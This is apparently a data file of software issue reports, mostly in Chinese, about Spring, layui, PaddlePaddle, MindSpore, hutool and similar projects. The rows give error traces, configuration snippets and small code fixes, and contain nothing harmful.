org.springframework.context.annotation.ConflictingBeanDefinitionException: Annotation-specified bean name 'pigLogoutSuccessEventHandler' for bean class [com.pig4cloud.pig.auth.support.handler.PigLogoutSuccessEventHandler] conflicts with existing, non-compatible bean definition of same name and class [com.pig4cloud.pig.auth.handler.PigLogoutSuccessEventHandler] at org.springframework.context.annotation.ConfigurationClassParser.parse(ConfigurationClassParser.java:189) at org.springframework.context.annotation.ConfigurationClassPostProcessor.processConfigBeanDefinitions(ConfigurationClassPostProcessor.java:331) at org.springframework.context.annotation.ConfigurationClassPostProcessor.postProcessBeanDefinitionRegistry(ConfigurationClassPostProcessor.java:247) at org.springframework.context.support.PostProcessorRegistrationDelegate.invokeBeanDefinitionRegistryPostProcessors(PostProcessorRegistrationDelegate.java:311) at org.springframework.context.support.PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(PostProcessorRegistrationDelegate.java:112) at org.springframework.context.support.AbstractApplicationContext.invokeBeanFactoryPostProcessors(AbstractApplicationContext.java:746) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:564) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:147) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:734) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:408) at org.springframework.boot.SpringApplication.run(SpringApplication.java:308) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1306) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1295) at com.pig4cloud.pig.auth.PigAuthApplication.main(PigAuthApplication.java:34) Caused by: org.springframework.context.annotation.ConflictingBeanDefinitionException: Annotation-specified bean name 'pigLogoutSuccessEventHandler' for bean class [com.pig4cloud.pig.auth.support.handler.PigLogoutSuccessEventHandler] conflicts with existing, non-compatible bean definition of same name and class [com.pig4cloud.pig.auth.handler.PigLogoutSuccessEventHandler] at org.springframework.context.annotation.ClassPathBeanDefinitionScanner.checkCandidate(ClassPathBeanDefinitionScanner.java:349) at org.springframework.context.annotation.ClassPathBeanDefinitionScanner.doScan(ClassPathBeanDefinitionScanner.java:287) at org.springframework.context.annotation.ComponentScanAnnotationParser.parse(ComponentScanAnnotationParser.java:128) at org.springframework.context.annotation.ConfigurationClassParser.doProcessConfigurationClass(ConfigurationClassParser.java:296) at org.springframework.context.annotation.ConfigurationClassParser.processConfigurationClass(ConfigurationClassParser.java:250) at org.springframework.context.annotation.ConfigurationClassParser.parse(ConfigurationClassParser.java:207) at org.springframework.context.annotation.ConfigurationClassParser.parse(ConfigurationClassParser.java:175) ... 13 common frames omitted 进程已结束,退出代码1"
时间控件，选择后，如果把光标定位到当前框，或者定位到下一个框？,"用这个代码就可以把时间控件加入输入框，dInvCreateDatetime是id。可是点完“现在”或者“确定”后，光标就不见了。再按TAB键，光标跑到第一个输入框去了。如何设置，点完“现在”或者“确定”后，光标在当前输入框，或者下一个输入框？谢谢   <code>: &lt;script&gt; layui.use(['form', 'layedit', 'laydate'], function(){ var form = layui.form ,layer = layui.layer ,layedit = layui.layedit ,laydate = layui.laydate; //执行一个laydate实例 laydate.render({ elem: '#dSDate'//指定元素 ,type: 'datetime' }); //执行一个laydate实例 laydate.render({ elem: '#dModifyDate'//指定元素 ,type: 'datetime' }); //执行一个laydate实例 laydate.render({ elem: '#dInvCreateDatetime'//指定元素 ,type: 'datetime' });"
gateway启动报错,Failed to bind properties under 'spring.cloud.sentinel.datasource.ds1.nacos.rule-type' to com.alibaba.cloud.sentinel.datasource.RuleType: Action: Update your application's configuration   <code>: Property: spring.cloud.sentinel.datasource.ds1.nacos.rule-type Value: flow Origin: class path resource [bootstrap.yml] - 42:24 Reason: 2
boundary,"Forest: 1.5.12 Backend: (okhttp/httpclient) 该问题是如何引起的？ 使用okhttp3时，contentType设置为multipart/form-data时，不会自动添加boundary，手动指定也不可以 使用httpclient时，需要手动指定boundary，且body不可对象传入 无 报错信息/完整请求日志（如果没有请求日志请把开关打开） 在使用okhttps时，失败原因:Multipart body must have at least one part. 在使用httpclient时，body不可以传入对象，必须单字符串传入 接口定义（必要时请提供） 失败组合 成功组合   <code>: @Post(url = ""{url}"",contentType = ""multipart/form-data; boundary=__1234567887654321"") String postZXWithHeaderQueryFormData(@Var(""url"") String url, @Header Map&lt;String, Object&gt; headerMap, @Body ZXAccessTokenParam object); @HttpClient @Post(url = ""{url}"",contentType = ""multipart/form-data; boundary=__1234567887654321"") String postZXWithHeaderQueryFormData(@Var(""url"") String url, @Header Map&lt;String, Object&gt; headerMap, @Body(""grant_type"") String grant_type, @Body(""password"") String password, @Body(""scope"") String scope, @Body(""username"") String username);"
提交集群任务失败,"v2版本通过receiver提交mpi集群任务，报错信息如上。   <code>: Traceback (most recent call last): File ""/home/forum/yishijie/paddlepaddle/output/submit.py"", line 288, in &lt;module&gt; no_prefix_train_args_dict, ).run() File ""/home/forum/yishijie/paddlepaddle/output/submit.py"", line 73, in run self._do_poster_request() File ""/home/forum/yishijie/paddlepaddle/output/submit.py"", line 162, in _do_poster_request print urllib2.urlopen(request).read() File ""/home/forum/.jumbo/lib/python2.7/urllib2.py"", line 126, in urlopen return _opener.open(url, data, timeout) File ""/home/forum/.jumbo/lib/python2.7/urllib2.py"", line 400, in open response = self._open(req, data) File ""/home/forum/.jumbo/lib/python2.7/urllib2.py"", line 418, in _open '_open', req) File ""/home/forum/.jumbo/lib/python2.7/urllib2.py"", line 378, in _call_chain result = func(*args) File ""build/bdist.linux-x86_64/egg/poster/streaminghttp.py"", line 142, in http_open File ""/home/forum/.jumbo/lib/python2.7/urllib2.py"", line 1180, in do_open r = h.getresponse(buffering=True) File ""/home/forum/.jumbo/lib/python2.7/httplib.py"", line 1030, in getresponse response.begin() File ""/home/forum/.jumbo/lib/python2.7/httplib.py"", line 407, in begin version, status, reason = self._read_status() File ""/home/forum/.jumbo/lib/python2.7/httplib.py"", line 371, in _read_status raise BadStatusLine(line) httplib.BadStatusLine: ''"
AbstractCache#onRemove在过期元素移除时不会被触发的问题,比如中的元素过期移除以及时的元素移除时并不会触发方法   <code>: get FIFOCache.pruneCache onRemove
有大佬帮我看一下，我这个为什么数据提交成功后，但是这个弹出框却没有,"数据提交成功，后台可以接收到数据，但是这个接受成功后的提示框一直出不来，有人能帮忙看一下吗？   <code>: // 监听提交 form.on('submit(add)', function (data) { // console.log(data.field); // layer.msg(JSON.stringify(data.field)); $.ajax({ type: ""POST"", url: ""/adminInfoReal/addAdminInfoReal"", data:{ ""adminRealUserId"": data.field.adminRealUserId // ""name"": ""value"" ,""adminRealName"": data.field.adminRealName ,""adminRealPhone"": data.field.adminRealPhone ,""adminRealEmail"": data.field.adminRealEmail ,""adminRealAddress"": data.field.province+data.field.city+data.field.county+data.field.realAddress }, dataType: ""json"", success: function (msg) { layer.msg(""成功""+JSON.stringify(msg)); // layer.alert(""增加成功"", { // icon: 6 // }, // function () { // //关闭当前frame // xadmin.close(); // // // 可以对父窗口进行刷新 // xadmin.father_reload(); // }); // var json = eval(msg.show); // console.log(msg); }, error: function (msg) { layer.msg(""错误123:""+JSON.stringify(msg)); } }); return true;//设置表单提交后，不进行跳转 });"
当table使用筛选列后，此时导出csv或者excel，合计行无法被筛选,"现象：当table使用筛选列功能隐藏若干列后，此时导出csv或者excel，合计行仍然会显示被隐藏的那些列。 如下图所示，当把 登入次数列隐藏后，导出的csv里面仍然有该列的统计值 修改table.js第1980行的表合计功能代码如下：   <code>: layui.each(that.dataTotal, function(key, value){ //表合计 2021.09.10 增加,修改隐藏掉某一列时，导出csv表格里的合计行不正确的bug table.eachCols( id, function(i4, item4){ if( key == item4.field) { if( !item4.hide ) { dataTotal.push(value); } return; } }); //dataTotal.push(value);//2021.09.10 删除 });"
"Optimizer set error, ... should in state dict","我按照正常的步骤，保存和加载优化器的checkpoint， 可是在反向传播梯度的优化过程中报错。 我盯了这个错误一上午，一脸懵逼。不知道该怎么改，请问能不能给点提示，这种错误出现的情况都有哪些？   <code>: F.save_dygraph(self.net_G.state_dict(), save_path + '_net_G') F.save_dygraph(self.opt_G.state_dict(), save_path + '_net_G') net_G_dict, opt_G_dict = dg.load_dygraph(checkpoint_path + '_net_G') if resume: self.net_G.set_dict(net_G_dict) self.opt_G.set_dict(opt_G_dict) print(""Load from: {}"".format(checkpoint_path)) File ""/home/aistudio/vid2vid/utils/trainer.py"", line 420, in get_gen_losses self.opt_G.minimize(total_loss) File ""&lt;/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/decorator.py:decorator-gen-103&gt;"", line 2, in minimize File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dygraph/base.py"", line 257, in __impl__ return func(*args, **kwargs) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/optimizer.py"", line 949, in minimize loss, startup_program=startup_program, params_grads=params_grads) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/optimizer.py"", line 856, in apply_optimize optimize_ops = self._create_optimization_pass(params_grads) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/optimizer.py"", line 662, in _create_optimization_pass [p[0] for p in parameters_and_grads if p[0].trainable]) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/optimizer.py"", line 2031, in _create_accumulators self._add_accumulator(self._moment1_acc_str, p) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/optimizer.py"", line 580, in _add_accumulator ""Optimizer set error, {} should in state dict"".format( var_name ) AssertionError: Optimizer set error, spectral_normalization_124.w_0_moment1_0 should in state dict"
 pom配置文件 Swagger3依赖的 exclusion 报错,加上 好了   <code>: &lt;!-- Swagger3依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.0.0&lt;/version&gt; &lt;exclusion&gt; &lt;groupId&gt;io.swagger&lt;/groupId&gt; &lt;artifactId&gt;swagger-models&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/dependency&gt;
cn.hutool.json.JSONObject#getStr 取字符转换了编码内容,"jsonStr 原始数据： {""file_name"":""RMM20180127009_731.000"",""error_data"":""201121151350701001252500000032 18973908335 18973908335 13601893517 201711211700152017112115135420171121 6594000000010100000000000000000000000043190101701001910072 100001100 "",""error_code"":""F140"",""error_info"":""最早发送时间格式错误，该字段可以为空，当不为空时正确填写格式为“YYYYMMDDHHMISS”"",""app_name"":""inter-pre-check""} 得到的结果： F140 最早发送时间格式错误，该字段可以为空，当不为空时正确填写格式为\u201cYYYYMMDDHHMISS\u201d 和原来的error_info 不一样了。 场景是：上一个节点检查数据，丢出错误的信息行；下一个节点从redis中获取数据List后，进行转换为实体   <code>: JSONObject json = new JSONObject(jsonStr); System.out.println(json.getStr(""error_code"")); System.out.println(json.getStr(""error_info""));"
NOTICE: `model_zoo`已分离独立建立新仓`models`，接续9.16 00:00时刻的mindspore内容，原model_zoo目录之后不接受新增合入,Attention 将分离独立建立新仓，9.14号之后不接受原路径的新增合入。 所有已有提交尽量在9.14号之前完成合入，或者迁移到新仓进行提交 9.16 已分离独立建立新仓，承接9.16 00:00时刻的mindspore内容，原model_zoo目录之后不接受新增合入   <code>: model_zoo models model_zoo models
【ST】【MS】【OPS】zeropad2d算子在mindspore 2.0master分支GPU、CPU后端用例执行dynamic_shape报错,"zeropad2d算子在mindspore 2.0master分支GPU、CPU后端用例执行dynamic_shape报错 / 硬件环境: /device GPU/CPU : -- MindSpore version : mindspore 2.0.0 commit_id = ''[sha1]:cd15cccd,[branch]:(HEAD,origin/master,origin/HEAD,master)'' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_ms_ops_zeropad2d_func_input_2d test_ms_ops_zeropad2d_func_input_3d test_ms_ops_zeropad2d_func_input_4d test_ms_ops_zeropad2d_func_input_5d test_ms_ops_zeropad2d_func_input_6d test_ms_ops_zeropad2d_func_input_7d test_ms_ops_zeropad2d_func_input_4d_padding_int test_ms_ops_zeropad2d_func_input_4d_padding_int_negative test_ms_ops_zeropad2d_func_input_4d_padding_tuple_negative test_ms_ops_zeropad2d_func_input_4d_big_input test_ms_ops_zeropad2d_func_input_4d_float32 test_ms_ops_zeropad2d_func_input_4d_int32 test_ms_ops_zeropad2d_func_input_4d_float64 test_ms_ops_zeropad2d_func_input_4d_int16 export ME_DYNAMIC_SHAPE=1 export DEVICE_TYPE=CPU_X86 / export DEVICE_TYPE=GPU_PCIE pytest -s test_ms_ops_zeropad2d_func.py 用例执行通过 算子负责人：梁成辉   <code>: ../../../../common/ms_aw/operator/nn/zeropad2d_ops.py:92: in grad_cmp input_grad_mindspore = self.grad_mindspore_impl() ../../../../common/ms_aw/operator/nn/zeropad2d_ops.py:71: in grad_mindspore_impl input_grad = grad_net(input_ms, output_grad) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py:640: in __call__ raise err /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py:636: in __call__ output = self._run_construct(args, kwargs) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py:412: in _run_construct output = self.construct(*cast_inputs, **kwargs) ../../../../common/utils/operator_helper.py:48: in construct return self.grad(self.network)(*inputs) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/composite/base.py:378: in after_grad return grad_(fn)(*args, **kwargs) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py:96: in wrapper results = fn(*arg, **kwargs) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/composite/base.py:365: in after_grad self._pynative_forward_run(fn, grad_, args, kwargs) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/composite/base.py:404: in _pynative_forward_run fn(*args, **new_kwargs) ../../../../common/utils/operator_helper.py:319: in __call__ self.run_dynamic_shape(*args, **kwargs) ../../../../common/utils/operator_helper.py:289: in run_dynamic_shape outputs_grad_dyn = grad_net1(*args_grad, **kwargs) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py:640: in __call__ raise err /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py:636: in __call__ output = self._run_construct(args, kwargs) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py:412: in _run_construct output = self.construct(*cast_inputs, **kwargs) ../../../../common/utils/operator_helper.py:48: in construct return self.grad(self.network)(*inputs) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/composite/base.py:378: in after_grad return grad_(fn)(*args, **kwargs) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py:96: in wrapper results = fn(*arg, **kwargs) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/composite/base.py:366: in after_grad _pynative_executor.grad(fn, grad_, weights, self.grad_position, *args, **kwargs)"
支持获取响应原因短语，即响应状态文本,"支持获取响应原因短语，即响应状态文本，如 Response 的状态为： 则通过 ForestResponse.getReasonPhrase()可以获取原因短语，即字符串 ""OK""   <code>: status: 200 OK // 获取Forest响应对象 ForestResponse response = ... // 获取响应原因短语 String phrase = response.getReasonPhrase() // OK"
3.0.1 avue-crud 自定义表单失效,"不管column里加没加入formslot属性，弹出的都是默认属性   <code>: &lt;template #articleContentForm=""{type,disabled}""&gt; &lt;el-tag&gt;窗口类型:{{type=='add'?'新增':'修改'}}&lt;/el-tag&gt; &lt;el-tag&gt;{{form.articleContent?form.articleContent:'暂时没有内容'}}&lt;/el-tag&gt; &lt;el-input :disabled=""disabled"" v-model=""form.articleContent""&gt;&lt;/el-input&gt; &lt;/template&gt; {label: '文章内容', prop: 'articleContent',showColumn: false, hide: true,},"
thymeleaf可变参数调用后台service返回结果为空值,"我根据ruoyi的前端查询数据字典的写法写了一个循环，已知subNode可返回正确结果，但是subNode2就是空值，是否“[[${@thymeleaf.selectBySiteName(""衡供Ⅰ"")}]]”这种写法只能加字符串不能加变量？ (https://images.gitee.com/uploads/images/2020/0108/090929_d5e6cf90_5400554.png ""屏幕截图.png"") 前端代码如下   <code>: var aduan = ""衡供Ⅰ""; //console.log(aduan); //一把aduan写入就查不到数据 var subNode = [[${@thymeleaf.selectBySiteName(""衡供Ⅰ"")}]]; //查找起始站点的所有子站点 var subNode2 = [[${@thymeleaf.selectBySiteName(aduan)}]]; for(var x=0;x&lt;subNode.length;x++){ console.log(subNode[x]); }"
Wrong logic in `gpu_info.cc` for reserving memory,"These lines are wrong about how to reserve memory in GPU https://github.com/PaddlePaddle/Paddle/blob/d7b67f2b7460bd68d4db41c63dbc3c92d4b95497/paddle/platform/gpu_info.cc#L78-L88 It should be:   <code>: size_t total = ... size_t avail = ... size_t reserving = ... avail = std::min(avail, total-reserving); allocating = Ratio* (total-reserving);"
Do not have AVX2 intrinsics and disabled MKL-DNN,"If the machine doesn't have AVX2 intrinsics, cmake warning.   <code>: CMake Warning at CMakeLists.txt:115 (message): Do not have AVX2 intrinsics and disabled MKL-DNN"
源码编译时`-K`选项无作用,": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 按教程选项应该是表示关闭AKG编译，但实际上及时设置为了，的值仍是 经本地排查，发现是在文件中未能正确设置的值。 如图，无论设置的是还是，的值都是。 正确的代码应该改为   <code>: -K off ENABLE_AKG ON bash build.sh -e gpu -K off -m train scripts/build/process_options.sh ENABLE_AKG -K on off ENABLE_AKG ON diff --git a/scripts/build/process_options.sh b/scripts/build/process_options.sh index 8a486c9..e4c02ec 100755 --- a/scripts/build/process_options.sh +++ b/scripts/build/process_options.sh @@ -86,7 +86,7 @@ process_options() I) build_option_proc_upper_i ;; K) - export ENABLE_AKG=""on"" + export ENABLE_AKG=""$OPTARG"" echo ""enable compile with akg"" ;; B) build_option_proc_upper_b ;;"
"[ST][MS][NET][ASR-dynamic][GPU 1p]TypeError: Connot join the return values of different branches, perhaps you need to make them equal","asr-dynamic网络在GPU环境1p训练失败 / 硬件环境: /device GPU : -- MindSpore version :r2.0 commit_id:55a05568 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20221017 MindSpore 版本：编译时间20221203121543 r2.0 commit_id:55a05568 (/): /mode graph test_ms_asr_dynamic_an4_32_train_check_loss_gpu_1p_0001.py cd solution_test/cases/02network/09audio/asr/train pytest -stest_ms_asr_dynamic_an4_32_train_check_loss_gpu_1p_0001.py 网络训练成功 走给梁志博   <code>: [CRITICAL] CORE(105398,7f09c77fe700,python):2022-12-03-21:38:37.056.590 [mindspore/core/abstract/abstract_value.cc:58] AbstractTypeJoinLogging] Type Join Failed: Abstract type AbstractTensor cannot join with AbstractScalar. For more details, please refer to https://www.mindspore.cn/search?inputValue=Type%20Join%20Failed Framework Error Message:This: AbstractTensor(shape: (), element: AbstractScalar(Type: Int64, Value: AnyValue, Shape: NoShape), value_ptr: 0x55a4c9236430, value: AnyValue), other: AbstractScalar(Type: Int64, Value: AnyValue, Shape: NoShape). Please check the node: @construct.PositionalEncoding.17:[CNode]18{[0]: [CNode]19}The Function Call Stack:In file /autotest/jenkins/workspace/TDT_deployment/solution_test/cases/02network/09audio/asr/train/test_ms_asr_dynamic_an4_32_train_check_loss_gpu_1p_0001/nets/embedding.py:42/ if -1 == l:/ In file /autotest/jenkins/workspace/TDT_deployment/solution_test/cases/02network/09audio/asr/train/test_ms_asr_dynamic_an4_32_train_check_loss_gpu_1p_0001/nets/encoder.py:40/ position_enc = self.pos_enc(conv_emb)/ In file /autotest/jenkins/workspace/TDT_deployment/solution_test/cases/02network/09audio/asr/train/test_ms_asr_dynamic_an4_32_train_check_loss_gpu_1p_0001/nets/multi_task.py:81/ enc_out = self.encoder(audio, enc_mask)/ In file /autotest/jenkins/workspace/TDT_deployment/solution_test/cases/02network/09audio/asr/train/test_ms_asr_dynamic_an4_32_train_check_loss_gpu_1p_0001/nets/multi_task.py:117/ (loss, aloss, closs) = self.network(*inputs)/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/dataset_helper.py:101/ return self.network(*outputs)/ [CRITICAL] ANALYZER(105398,7f09c77fe700,python):2022-12-03-21:38:37.537.677 [mindspore/ccsrc/pipeline/jit/static_analysis/static_analysis.cc:854] ProcessEvalResults] Cannot join the return values of different branches, perhaps you need to make them equal. Type Join Failed: Abstract type AbstractTensor cannot join with AbstractScalar. For more details, please refer to https://www.mindspore.cn/search?inputValue=Type%20Join%20FailedFramework Error Message:The abstract type of the return value of the current branch is AbstractScalar(Type: Int64, Value: AnyValue, Shape: NoShape), and that of the previous branch is AbstractTensor(shape: (), element: AbstractScalar(Type: Int64, Value: AnyValue, Shape: NoShape), value_ptr: 0x55a4c9236430, value: AnyValue). The node is @construct.PositionalEncoding.17:[CNode]18{[0]: @construct.PositionalEncoding.17:[CNode]19{[0]: ValueNode&lt;Primitive&gt; Switch, [1]: [CNode]110, [2]: ValueNode&lt;FuncGraph&gt; ?construct.PositionalEncoding.9, [3]: ValueNode&lt;FuncGraph&gt; ?construct.PositionalEncoding.16}}, true branch: ?construct.PositionalEncoding.9, false branch: ?construct.PositionalEncoding.16 dataset length: 948 data pre-process time is 0.030960798263549805 [WARNING] MD(105398,7f0cb602e740,python):2022-12-03-21:38:38.181.537 [mindspore/ccsrc/minddata/dataset/engine/datasetops/data_queue_op.cc:93] ~DataQueueOp] preprocess_batch: 2; batch_queue: 0, 0, 0, 0, 0; push_start_time: 2022-12-03-21:38:37.568.189, 2022-12-03-21:38:38.031.236; push_end_time: 2022-12-03-21:38:37.568.822, 2022-12-03-21:38:38.033.044. Traceback (most recent call last): File ""e2e_sink_dev_gpu.py"", line 135, in &lt;module&gt; run() File ""e2e_sink_dev_gpu.py"", line 130, in run model.train(args.epochs, dataset, callbacks=[SinkMonitor(1), ckpoint_cb]) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 1052, in train initial_epoch=initial_epoch) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 98, in wrapper func(self, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 614, in _train cb_params, sink_size, initial_epoch, valid_infos) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 692, in _train_dataset_sink_process outputs = train_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 627, in __call__ out = self.compile_and_run(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 945, in compile_and_run self.compile(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 919, in compile jit_config_dict=self._jit_config_dict) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 1347, in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) TypeError: Cannot join the return values of different branches, perhaps you need to make them equal. Type Join Failed: Abstract type AbstractTensor cannot join with AbstractScalar. For more details, please refer to https://www.mindspore.cn/search?inputValue=Type%20Join%20Failed ---------------------------------------------------- - The Traceback of Net Construct Code: ---------------------------------------------------- The function call stack (See file '/autotest/jenkins/workspace/TDT_deployment/solution_test/cases/02network/09audio/asr/train/test_ms_asr_dynamic_an4_32_train_check_loss_gpu_1p_0001/rank_0/om/analyze_fail.dat' for more details. Get instructions about `analyze_fail.dat` at https://www.mindspore.cn/search?inputValue=analyze_fail.dat): # 0 In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/dataset_helper.py:101 return self.network(*outputs) ^ # 1 In file /autotest/jenkins/workspace/TDT_deployment/solution_test/cases/02network/09audio/asr/train/test_ms_asr_dynamic_an4_32_train_check_loss_gpu_1p_0001/nets/multi_task.py:117 (loss, aloss, closs) = self.network(*inputs) ^ # 2 In file /autotest/jenkins/workspace/TDT_deployment/solution_test/cases/02network/09audio/asr/train/test_ms_asr_dynamic_an4_32_train_check_loss_gpu_1p_0001/nets/multi_task.py:81 enc_out = self.encoder(audio, enc_mask) ^ # 3 In file /autotest/jenkins/workspace/TDT_deployment/solution_test/cases/02network/09audio/asr/train/test_ms_asr_dynamic_an4_32_train_check_loss_gpu_1p_0001/nets/encoder.py:40 position_enc = self.pos_enc(conv_emb) ^ # 4 In file /autotest/jenkins/workspace/TDT_deployment/solution_test/cases/02network/09audio/asr/train/test_ms_asr_dynamic_an4_32_train_check_loss_gpu_1p_0001/nets/embedding.py:42 if -1 == l: ---------------------------------------------------- - Framework Error Message: (For framework developers) ---------------------------------------------------- The abstract type of the return value of the current branch is AbstractScalar(Type: Int64, Value: AnyValue, Shape: NoShape), and that of the previous branch is AbstractTensor(shape: (), element: AbstractScalar(Type: Int64, Value: AnyValue, Shape: NoShape), value_ptr: 0x55a4c9236430, value: AnyValue). The node is @construct.PositionalEncoding.17:[CNode]18{[0]: @construct.PositionalEncoding.17:[CNode]19{[0]: ValueNode&lt;Primitive&gt; Switch, [1]: [CNode]110, [2]: ValueNode&lt;FuncGraph&gt; ?construct.PositionalEncoding.9, [3]: ValueNode&lt;FuncGraph&gt; ?construct.PositionalEncoding.16}}, true branch: ?construct.PositionalEncoding.9, false branch: ?construct.PositionalEncoding.16 ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/pipeline/jit/static_analysis/static_analysis.cc:854 ProcessEvalResults"
AnalysisSchedule::Stop 释放资源,"背景： 我们尝试使用mindspore c++接口手动释放资源，当CPU利用率达到 90% 以上时，执行任意算子。 问题: 程序有以下随机报错: mindspore::abstract::AnalysisSchedule::Stop()从一个异步函数改成同步函数。 如下代码所示:   <code>: void AnalysisSchedule::Stop() { AsyncInferTaskPtr stop_task = AsyncInferTask::MakeShared(std::make_shared&lt;AsyncAbstract&gt;(), kStateStop); Add2Schedule(stop_task); } void AnalysisSchedule::Stop() { AsyncInferTaskPtr stop_task = AsyncInferTask::MakeShared(std::make_shared&lt;AsyncAbstract&gt;(), kStateStop); Add2Schedule(stop_task); // wait for the schedule to exit while(run_ || infer_thread_count_.load() &gt; 0) { std::this_thread::sleep_for(std::chrono::milliseconds(1)); } MS_LOG(DEBUG) &lt;&lt; ""Set analysis schedule to stop""; }"
import fluid提示找不到libcudart.so.9.0,运行release版paddle，报错： 仍报错   <code>: export LD_LIBRARY_PATH=/home/work/cuda-9.0/lib64/:/home/work/cudnn/cudnn_v7/cuda/lib64/:${PWD}/nccl_2.3.7-1+cuda9.0_x86_64/lib:$LD_LIBRARY_PATH
循环依赖了,"sa-token-quick-login版本是: 1.29.0 springboot版本是: 2.6.3 maven依赖   <code>: &lt;?xml version=""1.0"" encoding=""UTF-8""?&gt; &lt;project xmlns=""http://maven.apache.org/POM/4.0.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd""&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.6.3&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.example&lt;/groupId&gt; &lt;artifactId&gt;demo232323&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;name&gt;demo232323&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- Sa-Token-Quick-Login 插件 --&gt; &lt;dependency&gt; &lt;groupId&gt;cn.dev33&lt;/groupId&gt; &lt;artifactId&gt;sa-token-quick-login&lt;/artifactId&gt; &lt;version&gt;1.29.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt;"
新增的服务写的api给大众用怎么获取token,"新增一个服务，写一个api 访问的我现在写的api 返回 我知道在url加入access_token=xxxxxx 但我是从redis里面拿到的 然后我想在http://localhost:8080/auth/oauth/token 返回就需要验证吗 我怎么判断这个api要不要验证码，我只想直接让移动端直接拿到token访问我的api，   <code>: http://localhost:8080/member/member/hi invalid_tokenb32c472b-d088-4ccc-8391-4a6904db8bd1 http://localhost:8080/member/member/hi?access_token=cd14b7d7-9820-4327-95c8-ce49d54859b8 hi你成功访问到我了 { ""msg"": ""验证码不能为空"", ""code"": 500 }"
